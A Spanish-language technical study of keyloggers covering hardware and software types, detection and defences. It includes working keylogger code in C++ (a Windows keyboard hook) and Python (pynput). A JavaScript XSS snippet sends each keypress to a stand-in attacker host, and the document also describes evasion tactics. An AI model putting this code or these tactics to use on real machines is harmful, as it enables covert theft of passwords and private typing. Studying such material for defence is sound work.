### 1. Introducción

Este documento presenta un análisis exhaustivo de los keyloggers, herramientas de vigilancia diseñadas para interceptar y registrar las pulsaciones del teclado. Se exploran las arquitecturas de hardware y software, los vectores de implementación, las técnicas de evasión, los métodos de detección y las estrategias de defensa.  El objetivo es proporcionar una comprensión profunda de la amenaza y capacitar a los profesionales de seguridad para mitigar los riesgos asociados.

### 2. Arquitectura y Tipos de Keyloggers

Los keyloggers se clasifican principalmente en dos categorías: hardware y software, cada una con características técnicas y funcionales distintas.

#### 2.1 Keyloggers de Hardware

Los keyloggers de hardware son dispositivos físicos que se intercalan entre el teclado y la computadora para interceptar las pulsaciones de teclas a nivel físico.  Son independientes del sistema operativo y, por lo tanto, difíciles de detectar por métodos tradicionales de software antivirus.

##### 2.1.1 Tipos de Keyloggers de Hardware

*   **Adaptadores en línea:** Estos dispositivos se insertan físicamente entre el conector del teclado (USB o PS/2) y el puerto correspondiente en la computadora.

    *   **Ventajas:** Fácil instalación, no requiere software.
    *   **Desventajas:** Requiere acceso físico, pueden ser detectados visualmente.
    *   **Implementación:** El dispositivo intercepta las señales eléctricas que representan las pulsaciones de teclas y las almacena en una memoria interna.

*   **Dispositivos Integrados:** Se instalan internamente dentro del teclado estándar, requiriendo habilidades de soldadura y acceso directo al dispositivo.

    *   **Ventajas:** Difíciles de detectar sin desensamblar el teclado.
    *   **Desventajas:** Requiere habilidades técnicas para la instalación.
    *   **Implementación:**  El keylogger se conecta a la matriz de teclas del teclado y registra cada pulsación antes de que se envíe a la computadora.

*   **Keylogger de Firmware:** Modifican la BIOS de la computadora para registrar eventos mientras se procesan.

    *   **Ventajas:**  Profundamente integrado, difícil de detectar.
    *   **Desventajas:** Requiere conocimiento profundo del hardware y firmware.
    *   **Implementación:**  El firmware modificado intercepta las interrupciones del teclado y registra las pulsaciones.

*   **Wireless Keyboard Sniffers:**  Capturan los paquetes de datos transmitidos entre un teclado inalámbrico y su receptor.

    *   **Ventajas:**  No requiere acceso físico directo al teclado.
    *   **Desventajas:**  La información puede estar cifrada; requiere descifrado.
    *   **Implementación:**  El dispositivo actúa como un receptor no autorizado, capturando y decodificando (si no está cifrado) las señales del teclado.

*   **Keyloggers Overlay:**  Colocan un teclado falso sobre el original para capturar pulsaciones simultáneamente. Son comunes en ataques a cajeros automáticos.

    *   **Ventajas:**  Fácil de implementar en entornos públicos.
    *   **Desventajas:**  Fácilmente detectable visualmente si no está bien camuflado.
    *   **Implementación:**  Un teclado superpuesto registra las pulsaciones y las reenvía al teclado original para que el usuario no sospeche.

##### 2.1.2 Detección y Mitigación de Keyloggers de Hardware

*   **Inspección Física:**  Revisar los cables y conectores del teclado en busca de dispositivos sospechosos.
*   **Desensamblaje:**  Abrir el teclado para inspeccionar si hay hardware adicional.
*   **Análisis de Tráfico Inalámbrico:**  Monitorizar el tráfico de redes inalámbricas en busca de patrones sospechosos.
*   **Contramedidas:**
    *   Usar teclados con cable en entornos sensibles.
    *   Inspeccionar regularmente los equipos.
    *   Utilizar teclados virtuales en entornos de riesgo.

#### 2.2 Keyloggers de Software

Los keyloggers de software son programas maliciosos que se instalan en un dispositivo para monitorear la actividad. Se subdividen en varias categorías técnicas según el nivel de integración del sistema.

##### 2.2.1 Tipos de Keyloggers de Software

*   **User Mode (Hooking):** La forma más común y fácil de programar.
    *   **Mecánica:** Utilizan APIs del sistema operativo (como `SetWindowsHookEx` en Windows o `X11` en Linux) para "suscribirse" a los eventos de input.

    ```c++
    // Ejemplo de SetWindowsHookEx en C++
    [[include]] <Windows.h>
    [[include]] <iostream>

    HHOOK hHook;
    KBDLLHOOKSTRUCT kbdStruct;

    LRESULT CALLBACK LowLevelKeyboardProc(int nCode, WPARAM wParam, LPARAM lParam) {
        if (nCode == HC_ACTION) {
            kbdStruct = *((KBDLLHOOKSTRUCT*)lParam);
            if (wParam == WM_KEYDOWN) {
                std==cout << "Key pressed: " << kbdStruct.vkCode << std==endl;
            }
        }
        return CallNextHookEx(hHook, nCode, wParam, lParam);
    }

    int main() {
        hHook = SetWindowsHookEx(WH_KEYBOARD_LL, LowLevelKeyboardProc, GetModuleHandle(NULL), 0);
        if (hHook == NULL) {
            std==cerr << "SetWindowsHookEx failed: " << GetLastError() << std==endl;
            return 1;
        }

        MSG msg;
        while (GetMessage(&msg, NULL, 0, 0)) {
            TranslateMessage(&msg);
            DispatchMessage(&msg);
        }

        UnhookWindowsHookEx(hHook);
        return 0;
    }
    ```

    *Análisis del código C++:*
    * `#include <Windows.h>`: Incluye la cabecera de Windows para acceder a las funciones de la API de Windows.
    * `HHOOK hHook;`: Declara una variable de tipo `HHOOK` para almacenar el identificador del hook.
    * `KBDLLHOOKSTRUCT kbdStruct;`: Declara una variable de tipo `KBDLLHOOKSTRUCT` para almacenar la información de la pulsación de tecla.
    * `LowLevelKeyboardProc`: Función de callback que se llama cada vez que se presiona una tecla.
    * `SetWindowsHookEx(WH_KEYBOARD_LL, LowLevelKeyboardProc, GetModuleHandle(NULL), 0)`: Instala un hook de teclado de bajo nivel.
        * `WH_KEYBOARD_LL`: Especifica el tipo de hook (teclado de bajo nivel).
        * `LowLevelKeyboardProc`: Especifica la función de callback.
        * `GetModuleHandle(NULL)`: Obtiene el handle del módulo actual.
        * `0`: Especifica que el hook se aplica a todos los threads.
    * `GetMessage(&msg, NULL, 0, 0)`: Recupera mensajes de la cola de mensajes del thread.
    * `TranslateMessage(&msg)`: Traduce mensajes de teclado virtuales a caracteres.
    * `DispatchMessage(&msg)`: Envía el mensaje traducido a la ventana apropiada.
    * `UnhookWindowsHookEx(hHook)`: Desinstala el hook de teclado.
    *   **Ventajas:** Fácil de implementar.
    *   **Desventajas:** Fácil de detectar por el Administrador de Tareas y el AV.

*   **Kernel Mode (Drivers/Rootkits):** Se ejecutan con privilegios de sistema (Ring 0).
    *   **Mecánica:** Interceptan la señal directamente desde el driver del controlador de teclado (i8042prt.sys o kbdclass.sys).

    *Ejemplo Simplificado (PSEUDO-CÓDIGO) - Intercepción de IRQL en Kernel Mode:*

    ```c
    // PSEUDO-CÓDIGO (NO COMPILABLE DIRECTAMENTE)
    // Modificación de la Interrupt Descriptor Table (IDT)

    // 1. Guardar el handler original de la interrupción del teclado
    OriginalKeyboardInterruptHandler = IDT[KeyboardInterruptVector];

    // 2. Reemplazar el handler con nuestra función maliciosa
    IDT[KeyboardInterruptVector] = MyKeyloggerInterruptHandler;

    // 3. Nuestra función (MyKeyloggerInterruptHandler) se ejecuta en cada interrupción del teclado
    MyKeyloggerInterruptHandler(InterruptFrame* frame) {
      // Registrar la pulsación
      LogKeyPress(frame->ScanCode);

      // Llamar al handler original para no interrumpir el sistema
      OriginalKeyboardInterruptHandler(frame);
    }
    ```

    *ANÁLISIS del PSEUDO-CÓDIGO:*
    * `OriginalKeyboardInterruptHandler = IDT[KeyboardInterruptVector]`:  Guarda la dirección del manejador original de la interrupción del teclado, ubicado en la IDT (Interrupt Descriptor Table) en el índice correspondiente al vector de interrupción del teclado.  La IDT es una estructura de datos crucial en el kernel que mapea los vectores de interrupción a las rutinas de servicio de interrupción (ISRs).
    * `IDT[KeyboardInterruptVector] = MyKeyloggerInterruptHandler`:  Reemplaza la entrada en la IDT correspondiente al vector de interrupción del teclado con la dirección de la función del keylogger (`MyKeyloggerInterruptHandler`). Esto significa que, en lugar de llamar al manejador original, el sistema ahora llamará a la función del keylogger cada vez que se produzca una interrupción del teclado.
    * `MyKeyloggerInterruptHandler(InterruptFrame* frame)`:  Es la función del keylogger que se ejecuta cuando se produce una interrupción del teclado. Recibe un puntero `InterruptFrame` que contiene información sobre el estado del sistema en el momento de la interrupción.
    * `LogKeyPress(frame->ScanCode)`:  Registra la pulsación de tecla.  `frame->ScanCode` contiene el código de escaneo de la tecla presionada.
    * `OriginalKeyboardInterruptHandler(frame)`:  Llama al manejador de interrupciones original después de que el keylogger haya registrado la pulsación. Esto es crucial para mantener la funcionalidad normal del sistema y evitar que el keylogger cause inestabilidad.

    *   **Ventajas:** Pueden ocultarse del OS.
    *   **Desventajas:** Requieren conocimiento profundo del kernel y drivers. Son extremadamente difíciles de detectar sin análisis forense de memoria.

*   **Hypervisor / Firmware:** Se ejecutan por debajo del sistema operativo (Ring -1).
    *   **Mecánica:** Se ejecutan en un hipervisor, virtualizando todo el SO. Un ejemplo es "Blue Pill."

    *   **Ventajas:**  Prácticamente indetectables desde el sistema operativo huésped.
    *   **Desventajas:** Requieren un profundo conocimiento de la virtualización y el firmware.

*   **Basados en API:** Utilizan las interfaces de programación estándar del sistema operativo para registrar eventos de teclas. Conectan directamente a la API que gestiona el teclado.

*   **Inyección en memoria:** Modifican las tablas de memoria vinculadas con llamadas a funciones del sistema y navegadores de Internet, pudiendo evadir el control de cuentas de usuario de Windows (UAC).
*   **Keyloggers Móviles:** Malware que implementa la misma funcionalidad que un keylogger de software en computadoras. La diferencia principal es que registran interacciones con pantalla táctil en lugar de teclado, y pueden supervisar acciones adicionales en dispositivos infectados.

##### 2.2.2 Vectores de Implementación (Python/JS)

*   **Python (Librerías como `pynput` o `keyboard`):**

    ```python
    from pynput.keyboard import Key, Listener

    def on_press(key):
        try:
            with open("log.txt", "a") as f:
                f.write(str(key))
        except Exception as e:
            print(f"Error writing to log file: {e}")

    with Listener(on_press=on_press) as listener:
        listener.join()
    ```

    *ANÁLISIS del código Python:*
    * `from pynput.keyboard import Key, Listener`: Importa las clases `Key` y `Listener` del módulo `pynput.keyboard`. `Key` se usa para representar teclas especiales, y `Listener` es la clase principal para escuchar eventos de teclado.
    * `def on_press(key):`: Define una función llamada `on_press` que toma un argumento `key`. Esta función se llamará cada vez que se presione una tecla.
    * `try...except`:  Manejo de errores.
    * `with open("log.txt", "a") as f:`: Abre el archivo "log.txt" en modo de anexión ("a"). Esto significa que los datos se agregarán al final del archivo sin sobrescribir el contenido existente.  El `with` asegura que el archivo se cierra automáticamente después de su uso.
    * `f.write(str(key))`: Escribe la tecla presionada en el archivo. `str(key)` convierte el objeto `key` (que puede ser una tecla normal o una tecla especial) a una cadena.
    * `with Listener(on_press=on_press) as listener:`: Crea una instancia de la clase `Listener`, pasándole la función `on_press` como el callback que se llamará cada vez que se presione una tecla.  El `with` asegura que el listener se detenga automáticamente cuando el bloque de código termine.
    * `listener.join()`: Inicia el listener y lo mantiene en ejecución hasta que se interrumpa manualmente (por ejemplo, con Ctrl+C).

*   **JavaScript (Browser-based):**
    *   **XSS (Cross-Site Scripting):** Inyectar JS en una web legítima para escuchar `onkeypress` y enviarlo a un servidor atacante.

    ```javascript
    // Ejemplo de Keylogger en JavaScript (para demostración)
    document.addEventListener('keypress', function (e) {
        fetch('https://atacante.com/log', {
            method: 'POST',
            body: JSON.stringify({ key: e.key })
        }).catch(error => console.error('Error:', error));
    });
    ```

    *ANÁLISIS del código JavaScript:*
    * `document.addEventListener('keypress', function (e) { ... });`:  Añade un listener de eventos al documento.  Escucha el evento `keypress`, que se dispara cuando se presiona una tecla que produce un carácter. La función anónima que se pasa como segundo argumento se ejecutará cada vez que se dispare el evento `keypress`.
    * `function (e) { ... }`:  Es la función de callback que se ejecuta cuando se dispara el evento `keypress`.  Recibe un objeto de evento `e` que contiene información sobre el evento.
    * `fetch('https://atacante.com/log', { ... })`:  Realiza una petición HTTP POST a la URL 'https://atacante.com/log'.  La función `fetch` se utiliza para realizar peticiones de red en JavaScript.
    * `{ method: 'POST', body: JSON.stringify({ key: e.key }) }`:  Define las opciones de la petición HTTP.
        * `method: 'POST'`:  Especifica que la petición es de tipo POST.
        * `body: JSON.stringify({ key: e.key })`:  Define el cuerpo de la petición.  `JSON.stringify({ key: e.key })` convierte un objeto JavaScript que contiene la tecla presionada (`e.key`) a una cadena JSON.
    * `.catch(error => console.error('Error:', error))`:  Captura cualquier error que ocurra durante la petición HTTP y lo imprime en la consola.

##### 2.2.3 Detección y Defensa contra Keyloggers de Software

*   **Análisis de Comportamiento:**
    *   Buscar procesos que usan hooks de teclado globales.
    *   Monitorizar conexiones salientes (C2) inesperadas.
*   **Antivirus y Anti-Malware:**  Utilizar software de seguridad actualizado.
*   **Análisis de Procesos:**  Revisar la lista de procesos en ejecución en busca de programas sospechosos.
*   **Herramientas de Detección de Rootkits:**  Utilizar herramientas especializadas para detectar keyloggers en modo kernel.
*   **Teclados Virtuales (On-Screen):** Útiles contra keyloggers de hardware y algunos de software básicos, aunque los keyloggers avanzados pueden tomar capturas de pantalla (Screenloggers) al hacer clic.
*   **Cifrado de Teclado (KeyScramblers):** Software que cifra la pulsación a nivel de kernel y la descifra solo en la aplicación destino. El keylogger intercepta basura cifrada.

### 3. Técnicas de Evasión

Los creadores de keyloggers emplean diversas técnicas para evitar la detección y el análisis.

*   **Polimorfismo:** Cambiar la firma del binario cada vez que se compila para evadir antivirus basados en firmas.  Esto se logra mediante la reordenación del código, la inserción de instrucciones NOP (No Operation) o la utilización de técnicas de ofuscación.

*   **Inyección en Memoria:** No escribir el log en disco (fileless malware), enviarlo directamente por red.  Esto dificulta el análisis forense, ya que no hay archivos que examinar.

*   **Timing:** Registrar solo cuando se detecta actividad específica (ej. ventana de banco abierta).  Esto reduce la cantidad de datos registrados y hace que sea más difícil detectar patrones sospechosos.

### 4. Capacidades Ampliadas

Más allá de registrar pulsaciones de teclas, los keyloggers modernos han integrado funcionalidades adicionales que incluyen:

*   Control de la cámara del equipo
*   Captura de pantalla (Screenloggers)
*   Acceso al clipboard o portapapeles
*   Grabación de llamadas de voz
*   Control del micrófono del dispositivo
*   Recopilación de video o audio

### 5. Resumen de Estudio

Para dominar este tema, es fundamental investigar:

*   **Windows API Hooks** (`SetWindowsHookEx`).
*   **Linux Input Subsystem** (`/dev/input/event*`).
*   **Rootkits** y manipulación de la IDT (Interrupt Descriptor Table).

### 6. Penta-Resonancia (Conexiones Intuitivas)

*   **Música:**  La captura de datos puede ser vista como una forma de "transcripción" no autorizada, similar a grabar una canción sin permiso.
*   **Física:**  La interceptación de señales eléctricas entre el teclado y la computadora es una aplicación de la física electrónica.
*   **Gematría:**  La asignación de valores numéricos a las letras (como en Gematría) podría ser utilizada para encriptar los logs.
*   **Hacking:**  El keylogging es una técnica fundamental en el arsenal de un hacker para la recopilación de información.

### 7. Conclusión

Los keyloggers representan una seria amenaza para la seguridad de la información. La comprensión profunda de sus mecanismos, técnicas de evasión y métodos de detección es crucial para desarrollar estrategias de defensa efectivas.  Este documento ha proporcionado un análisis exhaustivo de la amenaza, capacitando a los profesionales de seguridad para mitigar los riesgos asociados.  La vigilancia constante, la implementación de medidas de seguridad multicapa y la educación de los usuarios son esenciales para protegerse contra los keyloggers.
